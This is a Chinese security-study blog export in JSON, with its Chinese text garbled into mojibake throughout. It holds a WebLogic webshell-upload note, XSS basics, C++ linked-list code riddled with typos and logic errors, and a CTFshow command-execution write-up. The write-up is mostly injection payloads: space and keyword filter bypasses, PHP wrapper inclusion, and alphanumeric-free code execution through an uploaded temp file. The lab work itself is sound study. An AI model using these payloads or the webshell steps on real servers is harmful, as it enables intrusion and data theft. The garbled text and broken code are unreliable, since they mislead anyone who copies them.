Dirä¸º\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/cssï¼Œè®¿é—®è¿™ä¸ªç›®å½•æ˜¯æ— éœ€æƒé™çš„ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚\nç„¶åç‚¹å‡»â€˜å®‰å…¨â€™â€”â€”>â€˜æ·»åŠ â€™ï¼Œä¸Šä¼ jspæœ¨é©¬\nå®¡æŸ¥æŸ¥çœ‹æ—¶é—´æˆ³\nè®¿é—®/ws_utc/css/config/keystore/[æ—¶é—´æˆ³]_[æ–‡ä»¶å]å³å¯æ‰§è¡Œwebshell\n```\n\n\n\n\n\n**æ–‡ä»¶ä¸Šä¼ éªšæ“ä½œ**\n\næŸäº›ç½‘ç«™åœ¨æ–‡ä»¶ä¸Šä¼ åä¸ä¼šç«‹åˆ»æäº¤æ•°æ®åŒ…åˆ°åç«¯ï¼Œè€Œæ˜¯å…ˆåœ¨æœ¬åœ°é¢„è§ˆï¼Œç­‰ç”¨æˆ·äºŒæ¬¡ç¡®è®¤åæ‰ä¼šå°†æ•°æ®è¿›è¡Œä¼ è¾“ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†ä¸ä½¿ç”¨æ™®é€šçš„POSTæ–‡ä»¶ä¼ è¾“ï¼Œè€Œæ˜¯ç»è¿‡åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œå°±ç¦»è°±\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY25 webæ¼æ´ XSSè·¨ç«™\n\näº§ç”ŸåŸç†\n\nä¸Šä¼ äº†JSä»£ç ç½‘é¡µæ¸²æŸ“å¯¼è‡´çš„\n\nå±å®³å½±å“\n\nåå°„å‹ï¼šæ•°æ®ä¸ä¼šè¢«å­˜å‚¨åˆ°æœåŠ¡å™¨\n\nå­˜å‚¨å‹ï¼šæ•°æ®è¢«å­˜å‚¨åˆ°æ•°æ®åº“\n\nDOMå‹\n\nç”Ÿæ•ˆç‰¹ç‚¹\n\nåå°„å‹\n\næäº¤xâ€”â€”>åç«¯â€”â€”>æ‰§è¡Œè¿”å›ç»“æœ\n\nå­˜å‚¨å‹\n\næäº¤xâ€”â€”>åç«¯å­˜å‚¨â€”â€”>å–å‡ºæ•°æ®â€”â€”>æ‰§è¡Œç»“æœ\n\nDOMå‹\n\næäº¤xâ€”â€”>æœ¬åœ°æµè§ˆå™¨é™æ€å‰ç«¯ä»£ç æ‰§è¡Œâ€”â€”>è¢«æäº¤åˆ°åç«¯æ‰§è¡Œ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"æ•°æ®ç»“æ„","url":"/2022/02/14/æ•°æ®ç»“æ„/","content":"\n# æ•°æ®ç»“æ„\n\n## çº¿æ€§ç»“æ„\n\n### çº¿æ€§è¡¨é¡ºåºç»“æ„å®ç°\n\n<!--more-->\n\n```C++\n//æ•°ç»„é™æ€åˆ†é…\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//æ•°ç»„åŠ¨æ€åˆ†é…\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)å‡½æ•°ï¼Œå¼€è¾Ÿmå­—èŠ‚é•¿åº¦çš„åœ°å€ç©ºé—´ï¼Œå¹¶è¿”å›è¿™æ®µç©ºé—´çš„é¦–åœ°å€\n//sizeof(x)è¿ç®—ï¼Œè®¡ç®—å˜é‡xçš„é•¿åº¦\n//free(p)å‡½æ•°ï¼Œé‡Šæ”¾æŒ‡é’ˆpæ‰€æŒ‡å˜é‡çš„å­˜å‚¨ç©ºé—´ï¼Œå½»åº•åˆ é™¤ä¸€ä¸ªå˜é‡\n//typedef type name å®šä¹‰ç§ç±»ä¸ºtypeçš„å˜é‡ç§ç±»\n\n\n//å„ç§åŠŸèƒ½å®ç°\n//å‡½æ•°ç»“æœçŠ¶æ€ä»£ç \n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Statusæ˜¯æ‰€æœ‰å‡½æ•°çš„ç±»å‹ï¼Œå€¼æ˜¯å‡½æ•°ç»“æœçŠ¶æ€ä»£ç \ntypedef int Status;\n\n//çº¿æ€§è¡¨åˆå§‹åŒ–\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//å†…å­˜å¼€è¾Ÿå¤±è´¥\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### çº¿æ€§è¡¨é“¾å¼ç»“æ„å®ç°\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//å•é“¾è¡¨å»ºç«‹æ–¹æ³•ï¼šå¤´æ’æ³•\n//1ã€å»ºç«‹ä¸€ä¸ªç©ºè¡¨ï¼Œé‡å¤è¯»å…¥æ•°æ®\n//2ã€ç”Ÿæˆæ–°èŠ‚ç‚¹ï¼Œå°†è¯»å…¥æ•°æ®å­˜æ”¾åˆ°æ–°èŠ‚ç‚¹çš„æ•°æ®åŸŸä¸­\n//3ã€ä»æœ€åä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹ï¼Œä¾æ¬¡å°†å„èŠ‚ç‚¹æ’å…¥åˆ°é“¾è¡¨çš„å‰ç«¯\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//å•é“¾è¡¨å»ºç«‹æ–¹æ³•ï¼šå¤´æ’æ³•\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//å°¾æŒ‡é’ˆ\nr=p\n    \n//å¾ªç¯é“¾è¡¨\n//å¥½å¤„ï¼šä»è¡¨ä¸­ä»»æ„é˜¶æ®µå‡ºå‘å‡å¯æ‰¾åˆ°è¡¨ä¸­å…¶ä»–èŠ‚ç‚¹\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//åŒå‘é“¾è¡¨\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//çº¿æ€§è¡¨åˆå¹¶\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//æœ‰åºè¡¨åˆå¹¶\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### æ ˆå’Œé˜Ÿåˆ—\n\n```C++\n//æ ˆåªèƒ½åœ¨è¡¨å°¾è¿›è¡Œæ’å…¥å’Œåˆ é™¤\n//é˜Ÿåˆ—åªèƒ½åœ¨è¡¨å°¾æ’å…¥ï¼Œè¡¨å¤´åˆ é™¤\n```\n\n","tags":["C++"]},{"title":"CTFshowå‘½ä»¤æ‰§è¡Œ","url":"/2022/02/07/CTFshowå‘½ä»¤æ‰§è¡Œ/","content":"\nå¯ç”¨äºæ‰§è¡Œphpå‡½æ•°çš„å‡½æ•°ï¼š\n\n```\neval()ã€assert()ã€preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//æ­£åˆ™è§„åˆ™ä¸­å«æœ‰/eä¿®é¥°ç¬¦å°±å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´\ncreate_function()\n```\n\nå¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š\n\n```php\nexec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npassthru()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ\nsystem()//æ‰§è¡Œåç›´æ¥æ˜¾ç¤ºç»“æœ,è¿”å›å€¼ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œ å¤±è´¥åˆ™è¿”å› false\nshell_exec()//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\n`å‘½ä»¤`//è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒåŠ echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\nå¯ç”¨äºæ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦ï¼š\n\n```\n%09ã€$IFS$9ã€ ${IFS}ã€$IFS%09ã€< ã€<>ã€%20ç­‰\n```\n\nå¯ç”¨äºè¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼š\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\n```\n\né€šé…ç¬¦ï¼š\n\n```\n*ä»£è¡¨ä»»æ„ä½\n?ä»£è¡¨ä¸€ä½\n```\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ï¼Œf*ä»£è¡¨åŒ¹é…æ‰€æœ‰ä»¥få¼€å¤´çš„æ–‡ä»¶ï¼Œ\\`å†…éƒ¨ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œé€šè¿‡echoå¾—åˆ°è¿”å›å€¼\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,phpï¼ŒåŒä¸Š\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼ï¼Œä½¿ç”¨%09å°†ç©ºæ ¼æ›¿ä»£å³å¯\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«å‡½æ•°`include()`ï¼Œincludeå¯ä»¥å®ç°æ— æ‹¬å·åŒ…å«ï¼Œè¿›è€Œé€šè¿‡`?>`å°†æ•´ä¸ªPHPä»£ç é—­åˆå³å¯ç»•è¿‡åˆ†å·ï¼Œè€Œåå°±èƒ½åšåˆ°å‚æ•°é€ƒé€¸ï¼ˆå› ä¸ºä»£ç ä¸­åªæ£€æµ‹äº†cä¸­ä¼ å…¥çš„å†…å®¹ï¼‰ï¼Œè¿›è€Œé€šè¿‡ä¼ å…¥å‚æ•°é€šè¿‡phpä¼ªåè®®è¯»å–å†…å®¹\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·ï¼ŒåŒä¸Š\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·ï¼ŒåŒä¸Š\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·ï¼ŒåŒä¸Š\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\né¢˜ç›®è¿‡æ»¤äº†flag,system,php,cat,sort,shell,å°æ•°ç‚¹,ç©ºæ ¼,å•å¼•å·,æ³¢æµªå·,echo,åˆ†å·,æ‹¬å·,åŒå¼•å·,å†’å·,å·¦å°–æ‹¬å·,ç­‰äºå·,æ•°å­—ï¼Œå°†getå‚æ•°ä¸­çš„æ•°å­—æ”¹ä¸ºå­—æ¯å³å¯\n\n##### 37\n\n```\npayload:?c=php://input\nè¯·æ±‚ä½“:<?php include \"flag.php\"?>\næˆ–\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\nincludeå‡½æ•°å¼€å§‹ï¼Œè¿‡æ»¤äº†flagï¼Œé€šè¿‡php://inputä¼ªåè®®ç›´æ¥åŒ…å«æ–‡ä»¶\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\nè¿‡æ»¤äº†flag, php,fileï¼Œé€šè¿‡dataä¼ªåè®®æ‰§è¡Œinclude \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\nè¿‡æ»¤äº†flagå¹¶ä¸”åŒ…å«çš„æ˜¯å˜é‡c.phpï¼Œè¾“å…¥åç›¸å½“äºç›´æ¥æ‰§è¡Œè¾“å…¥çš„PHPå‘½ä»¤ï¼Œç”±äºå‰é¢çš„PHPå†…å®¹å·²ç»é—­åˆï¼Œæ‰€ä»¥åé¢çš„.phpç›´æ¥å°±æ˜¯.phpæ–‡æœ¬æ˜¾ç¤ºï¼Œå¯¹å‰é¢çš„å‘½ä»¤è¾“å…¥æ²¡æœ‰å½±å“\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());å¯ä»¥æ‹¿åˆ°æ‰€æœ‰å·²ç»å®šä¹‰çš„å˜é‡å¹¶å–å¾—å€¼\n\nnext(å˜é‡)å¯ä»¥è·å¾—ä¸‹ä¸€ä¸ªå˜é‡\n\narray_pop(æ•°ç»„)å¼¹å‡ºæ•°ç»„ä¸­çš„å˜é‡ä¸ºå•ä¸ªç‹¬ç«‹å˜é‡\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\næœ¬åœ°ä¿®æ”¹sessionIDä¼ å…¥å‘½ä»¤\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\nå¯ä»¥å‘ç°å¤§å¤šæ•°è‡ªè´Ÿéƒ½è¢«è¿‡æ»¤ï¼ŒæŸ¥çœ‹æç¤º\n\né€šè¿‡è„šæœ¬å¯è·å–å¼‚æˆ–ï¼ˆï½œï¼‰åèƒ½å¾—åˆ°çš„æ‰€æœ‰å­—ç¬¦\n\nç›´æ¥ä½¿ç”¨è„šæœ¬\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\né¢˜ç›®ä¸­å°†å‘½ä»¤è¾“å‡ºä¿å­˜åˆ°é»‘æ´ä¸­ï¼Œå¯é€šè¿‡åˆ†å·åˆ†å‰²å‘½ä»¤è®©ç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤ç›´æ¥æ˜¾ç¤º\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†catå’Œåˆ†å·ï¼Œé€šè¿‡&&ä¹Ÿå¯è¿›è¡Œå¤šå‘½ä»¤æ‰§è¡Œï¼Œè¦è¿›è¡ŒURLç¼–ç \n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†flagï¼Œä½¿ç”¨é€šé…ç¬¦\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰¾ä¸ªèƒ½æ›¿ä»£çš„å°±è¡Œ\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†*å’Œ$ï¼Œä½¿ç”¨%09ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰æ›¿ä»£ç©ºæ ¼\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†ä¸€äº›è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œä½†æ²¡æ»¤tacï¼Œç›´æ¥ç”¨\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ•°å­—å’Œç©ºæ ¼\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\nåŒä¸Šé¢˜ï¼Œè¿‡æ»¤äº†æ°´å¹³åˆ¶è¡¨ç¬¦å’Œ&&ç¬¦ï¼Œå°†&æ›´æ¢ä¸ºï½œä¹Ÿå¯ä»¥å¤šå‘½ä»¤æ‰§è¡Œ\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\næ»¤äº†tacå‘œå‘œå‘œå‘œç”¨nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\næ»¤æ‰äº†å°–æ‹¬å·ä½†æ˜¯$å›æ¥äº†\n\n`nl${IFS}fla%27%27g.php||`\n\nä½†æ˜¯æ˜æ˜¾flagä¸å¯¹ï¼Œæ‰€ä»¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•`ls${IFS}/`å‘ç°flagå­˜åœ¨\n\nä½¿ç”¨nlè¯»å–\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\nè¯¥é¢˜å†…å®¹ä¸åŒ\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\nå…ˆå°†å‘½ä»¤æ‰“å°å¹¶æ‰§è¡Œåè·å¾—systemå‡½æ•°çš„è¿”å›å€¼å¹¶è¾“å‡ºï¼Œsystemå‡½æ•°åªè¿”å›å‘½ä»¤æ‰§è¡Œåè¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œä½¿ç”¨tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\nè¿‡æ»¤äº†å•å¼•å·ç»•è¿‡ï¼Œé€šè¿‡mvå‘½ä»¤é‡å‘½åç›´æ¥è¯»å–\n\n##### 55\n\nè¿‡æ»¤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ**\n\nç›´æ¥è®²åŸç†å’¯\n\n.ï¼ˆç‚¹ï¼‰æˆ–è€…å«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„shellæ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„shellæ˜¯bashï¼Œåˆ™â€œ.fileâ€çš„æ„æ€å°±æ˜¯ç”¨bashæ‰§è¡Œfileæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ç”¨â€œ.fileâ€æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œé‚£ä¸å°±å¯ä»¥åˆ©ç”¨â€œ.â€æ¥æ‰§è¡Œå®ƒäº†å—ï¼Ÿ\n\nå’‹æ‰§è¡Œå‘¢ï¼ŒåŸç†æ˜¯å½“æˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«å‚¨å­˜åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶æ˜¯`/tmp/phpXXXXXX`(å…­ä¸ªéšæœºå­—ç¬¦)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨é€šé…ç¬¦ï¼ˆ?å•åŒ¹é…å’Œ*å¤šåŒ¹é…ï¼‰æ¥å°è¯•æ‰§è¡Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½†æ˜¯å°è¯•æ‰§è¡Œåå‘ç°ä¸è¡Œï¼Œæˆ‘ä»¬è‡ªå·±æ­å»ºä¸€ä¸ªphpç¯å¢ƒçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\nåˆ—å‡ºç›¸å…³çš„æ–‡ä»¶åå‘ç°æ˜¯å› ä¸ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„æ–‡ä»¶æ•°é‡ä¸æ­¢ä¸€ä¸ªï¼Œå°±å¯¼è‡´è¿˜æ²¡è¿è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„è„šæœ¬æ—¶å°±å·²ç»ç»“æŸäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°è¯•ç”¨å…¶ä»–çš„é€šé…ç¬¦åŒ¹é…å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™ï¼ŒLinuxçš„globé€šé…ç¬¦çš„ç›¸å…³å†…å®¹ï¼ˆè´´ä¸ªé“¾æ¥ï¼‰\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\né™¤äº†ä½¿ç”¨?å’Œ*è¿›è¡Œä»»æ„åŒ¹é…ï¼Œè¿˜å¯ä»¥ä½¿ç”¨`[^X]`æ¥æ’é™¤æŸä¸ªå­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ’é™¤å‰é¢åŒ…å«`-`å’Œ`.`æ–‡ä»¶ï¼Œç»§ç»­æŸ¥çœ‹å‘ç°è¿˜å‰©ä¸‹ä¸‰ä¸ªæ–‡ä»¶ï¼Œè€Œåå‘ç°è¿˜æœ‰ä¸€ä¸ªé€šé…ç¬¦è¯­æ³•`[X-Y]`å¯ä»¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œè€Œä¸”åªæœ‰phpä¸´æ—¶æ–‡ä»¶ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ŒæŸ¥è¯¢asciiç è¡¨å‘ç°å¤§å†™å­—æ¯ä½äº`@`å’Œ`[`ä¹‹é—´ï¼Œæ‰€ä»¥æ„é€ `[@-[]`å°±å¯ä»¥åŒ¹é…åˆ°æˆ‘ä»¬çš„æ–‡ä»¶äº†\n\næœ€ç»ˆpayload\n\né¦–å…ˆæ„å»ºä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ•°æ®åŒ…POC</title>\n</head>\n<body>\n<form action=\"å½“å‰é“¾æ¥/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">æ–‡ä»¶åï¼š</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n</form>\n</body>\n</html>\n```\n\nç¬¬ä¸€ä¸ªæ–‡ä»¶å†…å®¹\n\n```shell\nls\nç„¶å\ncat /var/www/html/flag.php\n```\n\nå¦‚æœä¸€æ¬¡ä¸æˆåŠŸå°±repeaterå¤šè¯•å‡ æ¬¡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\næ‹¿åˆ°flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\nè¿‡æ»¤äº†å¤§é‡å­—ç¬¦ï¼Œæœ€ç»ˆéœ€è